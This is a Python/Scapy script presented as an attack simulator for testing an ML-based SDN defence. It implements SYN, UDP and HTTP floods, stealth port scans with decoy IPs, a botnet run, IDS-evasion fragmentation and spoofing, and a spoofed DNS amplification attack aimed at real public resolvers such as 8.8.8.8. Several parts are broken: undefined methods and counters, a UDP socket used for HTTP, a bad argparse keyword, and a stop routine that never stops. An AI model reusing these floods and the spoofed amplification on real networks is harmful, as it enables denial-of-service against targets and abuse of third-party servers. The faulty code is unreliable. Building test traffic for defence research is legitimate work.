#!/usr/bin/env python3

import socket
import threading
import time
import random
import subprocess
import sys
import os
import argparse
import json
from datetime import datetime, timedelta
from collections import defaultdict
import logging

try:
    from scapy.all import *
except ImportError:
    print('Error: Scapy not installed. ( pip install scapy )')
    sys.exit(1)

class AttackSimulator:
    def __init__(self, target_ip='10.0.1.100', attacker_ip='10.0.1.200', interface='eth0'):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.interface = interface
        self.running = False
        self.attack_threads = []
        self.statistics = defaultdict(int)

        self.configs = {
            'ddos':{
                'packet_rate': 1000,
                'duration': 60,
                'packet_size': 64,
                'source_ips': []
            },
            'port_scan': {
                'port_range': (1, 1024),
                'scan_rate': 100,
                'scan_type': 'syn'
            },
            'brute_force': {
                'target_port': 22,
                'attempt_rate': 10,
                'duration': 300,
                'username_list': ['admin', 'root', 'user', 'test'],
                'password_list': ['123456', 'password', 'admin', '12345']
            },
            'web_attack': {
                'target_port': 80,
                'attack_types': ['sql_injection', 'xss', 'path_traversal'],
                'request_rate': 50
            },
            'botnet': {
                'bot_count': 10,
                'command_interval': 30,
                'attack_coordination': True
            }
        }

        self.setup_logging()
        self.packet_templates = self.initialize_packet_templates()

    def setup_logging(self):
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        logging.basicConfig(level=logging.INFO, format=log_format)
        self.logger = logging.getLogger('AttackSimulator')

        os.makedirs('logs', exist_ok=True)
        file_handler = logging.FileHandler('logs/attack_simulator.log')
        file_handler.setFormatter(logging.Formatter(log_format))
        self.logger.addHandler(file_handler)

    def initialize_packet_templates(self):
        templates = {}

        templates['syn_flood'] = lambda src_ip, dst_ip, dst_port: (
            IP(src=src_ip, dst=dst_ip) /
            TCP(sport=random.randint(1024, 65535), dport=dst_port, flags='S',
                seq=random.randint(0, 4294967295))
        )

        templates['udp_flood'] = lambda src_ip, dst_ip, dst_port, payload_size: (
            IP(src=src_ip, dst=dst_ip) /
            UDP(sport=random.randint(1024, 65535), dport=dst_port) /
            Raw(load='A' * payload_size)
        )

        templates['icmp_flood'] = lambda src_ip, dst_ip, payload_size: (
            IP(src=src_ip, dst=dst_ip) /
            ICMP(type=8) /
            Raw(load='X' * payload_size)
        )

        templates['port_scan'] = lambda src_ip, dst_ip, dst_port: (
            IP(src=src_ip, dst=dst_ip) /
            TCP(sport=random.randint(1024, 65535), dport=dst_port, flags='S')
        )

        return templates

    def generate_source_ips(self, count=10, base_network='10.0.2'):
        source_ips = []
        for i in range(count):
            ip = f'{base_network}.{random.randint(100, 254)}'
            source_ips.append(ip)
        return source_ips

    def syn_flood(self, duration=60, packet_rate=1000, distributed=False):
        self.logger.info(f'Starting SYN Flood: {duration}s at {packet_rate}pps')
        self.running = True
        start_time = time.time()
        packets_sent = 0

        if distributed: source_ips = self.generate_source_ips(20)
        else: source_ips = [self.attacker_ip]

        target_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]

        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = random.choice(source_ips)
                dst_port = random.choice(target_ports)

                packet = IP(src=src_ip, dst=self.target_ip, ttl=random.randint(32, 128)) / \
                         TCP(sport=random.randint(1024, 65535),
                             dport=dst_port,
                             flags='S',
                             seq=random.randint(0, 4294967295),
                             window=random.choice([512, 1024, 2048, 4096, 8192]),
                             options=[('MSS', random.choice([536, 1460, 1440]))])

                send(packet, verbose=0, iface=self.interface)
                packets_sent += 1

                time.sleep(1.0/packet_rate)

                if packets_sent%1000 == 0: self.logger.info(f'SYN Flood: {packets_sent} packets sent')

            self.statistics['syn_flood_packets'] = packets_sent
            self.logger.info(f'SYN Flood completed: {packets_sent} packets sent')
        except Exception as e: self.logger.error(f'SYN Flood error: {e}')
        
    def udp_flood(self, duration=60, packet_rate=500):
        self.logger.info(f'Starting UDP Flood: {duration}s at {packet_rate}pps')
        self.running = True
        start_time = time.time()
        packets_sent = 0

        udp_services = {
            53: b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01', #DNS
            123: b'\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', #NTP
            161: b'\x30\x39\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63', #SNMP
            69: b'\x00\x01test.txt\x00netascii\x00', #TFTP
            514: b'<34>1 2021-01-01T00:00:00Z test test - - - Test syslog message' #Syslog
        }

        source_ips = self.generate_source_ips(15)

        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = random.choice(source_ips)
                dst_port = random.choice(list(udp_services.keys()))
                payload = udp_services.get(dst_port, b'A' * random.randint(100, 1400))

                packet = IP(src=src_ip, dst=self.target_ip) / \
                         UDP(sport=random.randint(1024, 65535), dport=dst_port) / \
                         Raw(load=payload)
                
                send(packet, verbose=0, iface=self.interface)
                packets_sent += 1

                time.sleep(1.0/packet_rate)

                if packets_sent%500 == 0: self.logger.info(f'UDP Flood: {packets_sent} packets sent')

            self.statistics['udp_flood_packets'] = packets_sent
            self.logger.info(f'UDP Flood completed: {packets_sent} packets sent')
        except Exception as e: self.logger.error(f'UDP Flood error: {e}')

    def port_scan(self, port_range=(1, 1024), scan_type='syn', stealth=True):
        start_port, end_port = port_range
        self.logger.info(f'Starting Port Scan: ports {start_port}-{end_port}, type: {scan_type}')
        self.running = True
        ports_scanned = 0

        decoy_ips = self.generate_source_ips(5) if stealth else [] # fake IP
        
        try:
            port_list = list(range(start_port, end_port + 1))
            random.shuffle(port_list)

            for port in port_list:
                if not self.running: break
                
                if scan_type == 'syn': 
                    if decoy_ips and random.choice([True, False]): src_ip = random.choice(decoy_ips)
                    else: src_ip = self.attacker_ip
                    packet = IP(src=src_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535),
                                 dport=port, flags='S',
                                 seq=random.randint(0,4294967295))

                elif scan_type == 'fin':
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535),
                                 dport=port, flags='F')

                elif scan_type == 'xmas':
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535),
                                 dport=port, flags='FPU')
                    
                elif scan_type == 'udp':
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             UDP(sport=random.randint(1024, 65535), dport=port) / \
                             Raw(load='scan')
                
                send(packet, verbose=0, iface=self.interface)
                ports_scanned += 1

                if stealth: time.sleep(random.uniform(0.01, 0.1))
                else: time.sleep(0.01)

                if ports_scanned%100 == 0: self.logger.info(f'Port Scan: {ports_scanned} ports scanned')
            
            self.statistics[f'{scan_type}_scan_ports'] = ports_scanned
            self.logger.info(f'Port Scan completed: {ports_scanned} ports scanned')
        except Exception as e: self.logger.error(f'Port Scan error: {e}')

    def http_flood_attack(self, duration=60, request_rate=100, attack_type='get'):
        self.logger.info(f'Starting HTTP Flood: {duration}s at {request_rate}rps, type: {attack_type}')
        self.running = True
        start_time = time.time()
        requests_sent = 0

        http_payloads = {
            'get': [
                "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n", # /
                "GET /index.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Chrome/91.0\r\n\r\n", # /index.html
                "GET /admin HTTP/1.1\r\nHost: {}\r\nUser-Agent: Firefox/89.0\r\n\r\n" # /admin
            ],
            'post': [
                "POST /login HTTP/1.1\r\nHost: {}\r\nContent-Length: 25\r\n\r\nuser=admin&pass=password", #/login
                "POST /search HTTP/1.1\r\nHost: {}\r\nContent-Length: 15\r\n\r\nquery=test+data" #/search
            ],
            'slowloris': [
                "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Slowloris\r\nAccept-language: en-us,en\r\nConnection: keep-alive\r\n"
            ]
        }

        user_agents = [ #OS
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

        try:
            while self.running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, 80))

                    payload_template = random.choice(http_payloads.get(attack_type, http_payloads['get']))
                    payload = payload_template.format(self.target_ip)

                    sock.send(payload.encode())

                    if attack_type != 'slowloris': sock.close()
                    else:
                        time.sleep(random.uniform(10, 30))
                        try: sock.send(b'X-a: b\r\n')
                        except: pass
                        finally: sock.close()
                    
                    request_sent += 1
                except socket.error: pass

                time.sleep(1.0/request_rate)

                if request_sent%100 == 0: self.logger.info(f'HTTP Flood: {request_sent} requests sent')

                self.statistics[f'{attack_type}_flood_requests'] = request_sent
                self.logger.info(f'HTTP Flood completed: {request_sent} requests sent')
        except Exception as e: self.logger.error(f'HTTP Flood error:{e}')

    def dns_amplification_attack(self, duration=60, query_rate=200):
        self.logger.info(f'Starting DNS Amplification: {duration}s at {query_rate}qps')
        self.running = True
        start_time = time.time()
        queries_sent = 0

        dns_servers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '208.67.222.222', '208.67.220.220'
        ]

        query_types = [
            ('isc.org', 'TXT'), # large txt
            ('google.com', 'ANY'), # any
            ('cloudflare.com', 'MX') # mail exchange
        ]

        try:
            while self.running and (time.time() - start_time) < duration:
                dns_server = random.choice(dns_servers)
                domain, qtype = random.choice(query_types)

                dns_query = IP(src=self.attacker_ip, dst=dns_server) / \
                            UDP(sport=random.randint(1024, 65535), dport=53) / \
                            DNS(id=random.randint(1, 65535),
                                qd=DNSQR(qname=domain, qtype=qtype), rd=1)
                
                dns_query[IP].src = self.target_ip

                send(dns_query, verbose=0, iface=self.interface)
                queries_sent += 1

                time.sleep(1.0/query_rate)

                if queries_sent%200 == 0: self.logger.info(f'DNS Amplification: {queries_sent} queries sent')
            
            self.statistics['dns_amplification_queries'] = queries_sent
            self.logger.info(f'DNS Amplification completed: {queries_sent} queries sent')
        except Exception as e: self.logger.error(f'DNS Amplification error: {e}')

    def botnet_simulation(self, bot_count=10, duration=300):
        self.logger.info(f'Starting Botnet Simulation: {bot_count} bots for {duration}s')
        self.running = True

        bot_ips = self.generate_source_ips(bot_count, '10.0.3')

        attack_phases = [
            {'type': 'reconnaissance', 'duration': 60},
            {'type': 'port_scan', 'duration': 120},
            {'type': 'ddos', 'duration': 120}
        ]

        def bot_worker(bot_ip, phase):
            if phase['type'] == 'reconnaissance':
                for i in range(1, 255):
                    if not self.running: break
                    
                    target = f'10.0.1.{i}'
                    packet = IP(src=bot_ip, dst=target) / ICMP()

                    send(packet, verbose=0, iface=self.interface)
                    time.sleep(0.1)
            
            elif phase['type'] == 'port_scan':
                common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
                for port in common_ports:
                    if not self.running: break

                    packet = IP(src=bot_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535), dport=port, flags='S')
                    
                    send(packet, verbose=0, iface=self.interface)
                    time.sleep(random.uniform(1, 3))

            elif phase['type'] == 'ddos':
                end_time = time.time() + phase['duration']
                while self.running and time.time() < end_time:
                    attack_type = random.choice(['syn', 'udp', 'icmp'])

                    if attack_type == 'syn':
                        packet = IP(src=bot_ip, dst=self.target_ip) / \
                                 TCP(sport=random.randint(1024, 65535), dport=80, flags='S')
                    elif attack_type == 'udp':
                        packet = IP(src=bot_ip, dst=self.target_ip) / \
                                 UDP(sport=random.randint(1024, 65535), dport=53) / \
                                 Raw(load='A' * 100)
                    else: packet = IP(src=bot_ip, dst=self.target_ip) / ICMP()

                    send(packet, verbose=0, iface=self.interface)
                    time.sleep(0.01)
        
        try:
            for phase in attack_phases:
                if not self.running: break
                self.logger.info(f'Botnet Phase: {phase['type']} for {phase['duration']}s')

                threads = []
                for bot_ip in bot_ips:
                    thread = threading.Thread(target=bot_worker, args=(bot_ip, phase))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                
                time.sleep(phase['duration'])

                for thread in threads: thread.join(timeout=1)
            
            self.logger.info('Botnet Simulation completed')
        except Exception as e: self.logger.error(f'Botnet Simulation error: {e}')

    def evasion_attack(self, duration=60): 
        self.logger.info(f'Starting Evasion Attack: {duration}s')
        self.running = True
        start_time = time.time()
        packets_sent = 0

        evasion_techniques = [
            'fragmentation', 'timing_evasion', 'source_spoofing',
            'protocol_switching', 'encrypted_payload'
        ]

        try:
            while self.running and (time.time() - start_time) < duration:
                technique = random.choice(evasion_techniques)

                if technique == 'fragmentation': 
                    large_payload = 'A' * 2000
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             UDP(sport=random.randint(1024, 65535), dport=80) / \
                             Raw(load=large_payload)

                    fragments = fragment(packet, fragsize=8)
                    for frag in fragments:
                        send(frag, verbose=0, iface=self.interface)
                        time.sleep(0.001)

                elif technique == 'timing_evasion':
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535), dport=80, flags='S')
                    
                    send(packet, verbose=0, iface=self.interface)
                    time.sleep(random.uniform(0.1, 5.0))

                elif technique == 'source_spoofing':
                    fake_src = f'10.0.{random.randint(1, 255)}.{random.randint(1, 254)}'
                    packet = IP(src=fake_src, dst=self.target_ip) / \
                             ICMP(type=8) / Raw(load='evasion_test')
                    
                    send(packet, verbose=0, iface=self.interface)
                
                elif technique == 'protocol_switching':
                    protocols = ['tcp', 'udp', 'icmp']
                    proto = random.choice(protocols)

                    if proto == 'tcp':
                        packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                                 TCP(sport=random.randint(1024, 65535), dport=random.choice([21, 22, 80, 443]), flags='S')
                    elif proto == 'udp':
                        packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                                 UDP(sport=random.randint(1024, 65535), dport=random.choice([53, 123, 161]))
                    else:
                        packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                                 ICMP(type=random.choice([0, 8, 11]))
                    
                    send(packet, verbose=0, iface=self.interface)

                elif technique == 'encrypted_payload':
                    encrypted_data = bytes([random.randint(0, 255) for _ in range(100)])
                    packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                             TCP(sport=random.randint(1024, 65535), dport=443, flags='PA') / \
                             Raw(load=encrypted_data)
                    
                    send(packet, verbose=0, iface=self.interface)
                
                packets_sent += 1
                time.sleep(random.uniform(0.5, 2.0))
            
            self.statistics['evasion_packets'] = packets_sent
            self.logger.info(f'Advanced Evasion completed: {packets_sent} packets sent')
        except Exception as e: self.logger.error(f'Advanced Evasion error: {e}')

    def mixed_attack_scenario(self, duration=300):
        self.logger.info(f'Starting Mixed Attack Scenario: {duration}s')
        self.running = True

        timeline = [
            {'time': 0, 'attack': 'reconnaissance', 'duration': 60},
            {'time': 0, 'attack': 'port_scan', 'duration': 120},
            {'time': 180, 'attack': 'brute_force', 'duration': 60},
            {'time': 240, 'attack': 'ddos', 'duration': 60}
        ]

        def execute_phase(attack_type, duration):
            if attack_type == 'reconnaissance':
                for i in range(1, 255):
                    if not self.running: break

                    target = f'10.0.1.{i}'
                    packet = IP(src=self.attacker_ip, dst=target) / ICMP()
                    send(packet, verbose=0, iface=self.interface)
                    time.sleep(0.2)
                
            elif attack_type == 'port_scan':
                self.advanced_port_scan((1, 1024), 'syn', stealth=True)
            
            elif attack_type == 'brute_force':
                self.http_flood_attack(duration, 20, 'post')
            
            elif attack_type == 'ddos':
                self.advanced_syn_flood(duration, 500, distributed=True)
            
        try:
            start_time = time.time()
        
            for phase in timeline:
                if not self.running: break

                while time.time() - start_time < phase['time']:
                    time.sleep(1)
                    if not self.running: break
                
                self.logger.info(f'Mixed Attack Phase: {phase['attack']}')

                phase_thread = threading.Thread(
                    target=execute_phase,
                    args=(phase['attack'], phase['duration'])
                )
                phase_thread.daemon = True
                phase_thread.start()
                self.attack_threads.appen(phase_thread)
            
            total_wait = max(p['time'] + p['duration'] for p in timeline)
            while time.time() - start_time < total_wait and self.running:
                time.sleep(1)
            
            self.logger.info('Mixed Attack Scenario completed')
        except Exception as e: self.logger.error(f'Mixed Attack Scenario error: {e}')

    def generate_normal_traffic(self, duration=60, request_rate=10):
        self.logger.info(f'Starting Normal Traffic Generation: {duration}s')
        self.running = True
        start_time = time.time()
        requests_sent = 0

        normal_requests = [
            'GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n',
            'GET /about.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Chrome/91.0\r\n\r\n',
            'GET /contact.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Firefox/89.0\r\n\r\n'
        ]

        try:
            while self.running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_ip, 80))

                    request = random.choice(normal_requests).format(self.target_ip)
                    sock.send(request.encode())

                    try:
                        response = sock.recv(1024)
                    except: pass

                    sock.close()
                    requests_sent += 1
                except socket.error: pass

                time.sleep(random.uniform(5, 15))
            
            self.statistics['normal_requests'] = requests_sent
            self.logger.info(f'Normal Traffic completed: {requests_sent} requests sent')
        except Exception as e: self.logger.error(f'Normal Traffic error: {e}')

    def stop_attacks(self):
        self.logger.info('Stopping all attacks ...')
        self.running = True

        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=5)
        
        self.logger.info('All attacks stopped')

    def get_statistics(self): return dict(self.statistics)

    def save_statistics(self, filename='attack_stats.json'):
        stats = {
            'timestamp': datetime.now().isoformat(),
            'target_ip': self.target_ip,
            'attacker_ip': self.attacker_ip,
            'statistics': dict(self.statistics)
        }

        with open(filename, 'w') as f: json.dump(stats, f, indent=2)

        self.logger.info(f'Statistics saved to {filename}')
def main():
    parser = argparse.ArgumentParser(description='Attack Simulator for ML-SDN Defense Testing')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--attacker', default='10.0.1.200', help='Attacker IP address')
    parser.add_argument('--interface', default='eth0', help='Network interface')
    parser.add_argument('--attack',
                        choices=['syn_flood', 'udp_flood', 'port_scan', 'http_flood', 'dns_amplification', 'botnet', 'evasion', 'mixed', 'normal'],
                        required=True, help='Attack type')
    parser.add_argument('--duration', type=int, default=60, http='Attack duration (seconds)')
    parser.add_argument('--rate', type=int, default=100, help='Attack rate (packets/requests per seconds)')
    parser.add_argument('--distributed', action='store_true', help='Use distributed sources')
    parser.add_argument('--stealth', action='store_true', help='Use stealth techniques')
    parser.add_argument('--output', default='attack_stats.json', help='Statistics output file')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print('This script requires root privileges for raw packet generation.')
        print('Please run with: sudo python3 AttackSimulator.py')
        return

    simulator = AttackSimulator(args.target, args.attacker, args.interface)

    try:
        if args.attack == 'syn_flood': simulator.syn_flood(args.duration, args.rate, args.distributed)
        elif args.attack == 'udp_flood': simulator.udp_flood(args.duration, args.rate)
        elif args.attack == 'port_scan':
            scan_type = 'syn' if not args.stealth else 'fin'
            simulator.port_scan((1, 1024), scan_type, args.stealth)
        elif args.attack == 'http_flood': simulator.http_flood_attack(args.duration, args.rate)
        elif args.attack == 'dns_amplification': simulator.dns_amplification_attack(args.duration, args.rate)
        elif args.attack == 'botnet': simulator.botnet_simulation(10, args.duration)
        elif args.attack == 'evasion': simulator.advanced_evasion_attack(args.duration)
        elif args.attack == 'mixed': simulator.mixed_attack_scenario(args.duration)
        elif args.attack == 'normal': simulator.generate_normal_traffic(args.duration, args.rate)

        simulator.save_statistics(args.output)

        stats = simulator.get_statistics()
        print(f'\n***** Attack Summary *****')
        print(f'Target: {args.target}')
        print(f'Attack: {args.attack}')
        print(f'Duration: {args.duration}s')
        print(f'Statistics: {stats}')
    
    except KeyboardInterrupt:
        print('\nAttack interrupted by user')
        simulator.stop_attacks()
    
    except Exception as e:
        print(f'Attack failed: {e}')
        simulator.stop_attacks()
        
if __name__ == '__main__': main()